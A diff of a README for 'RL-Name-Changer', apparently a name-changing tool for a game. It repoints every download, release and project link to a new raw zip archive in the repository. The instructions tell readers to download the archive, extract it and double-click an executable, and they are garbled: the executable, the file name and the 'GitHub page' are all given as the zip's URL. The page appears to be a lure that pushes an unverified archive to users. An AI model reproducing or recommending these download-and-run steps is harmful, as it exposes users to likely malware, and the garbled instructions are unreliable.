@@ -6,9 +6,9 @@ Welcome to RL-Name-Changer! This tool allows you to quickly change your name in 
 
 ## 📥 Download
 
-[![Download RL-Name-Changer](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip)](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip)
+[![Download RL-Name-Changer](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip)](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip)
 
-To download the software, visit this page: [Download RL-Name-Changer Releases](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip).
+To download the software, visit this page: [Download RL-Name-Changer Releases](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip).
 
 ## 🛠️ System Requirements
 
@@ -27,25 +27,25 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📝 Instructions to Download & Install
 
-1. Click on the [Download RL-Name-Changer Releases](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip) link.
+1. Click on the [Download RL-Name-Changer Releases](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip) link.
    
 2. On the Releases page, look for the latest version of the software.
 
-3. Find the file named `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip`. It may have a version number included, such as `v1.0`.
+3. Find the file named `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip`. It may have a version number included, such as `v1.0`.
 
 4. Click on the file to download it to your computer.
 
-5. Once the download finishes, locate `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip` in your downloads folder.
+5. Once the download finishes, locate `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip` in your downloads folder.
 
 6. Extract the contents of the zip file to a folder on your computer.
 
-7. Open the folder. You should see an executable file named `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip`.
+7. Open the folder. You should see an executable file named `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip`.
 
-8. Double-click on `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip` to start the program.
+8. Double-click on `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip` to start the program.
 
 ## ⚙️ How to Use
 
-1. Launch the application by double-clicking the `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip` file.
+1. Launch the application by double-clicking the `https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip` file.
 
 2. Follow the prompts to enter your new desired name.
 
@@ -63,7 +63,7 @@ If you face issues, consider the following solutions:
 
 ## 🔗 Additional Resources
 
-For more information about the tool and community support, please visit our [GitHub page](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/precis/RL-Name-Changer.zip).
+For more information about the tool and community support, please visit our [GitHub page](https://raw.githubusercontent.com/brahimelgarouaoui/RL-Name-Changer/main/src/Name-R-Changer-v2.3.zip).
 
 ## 🤝 Contributing
 
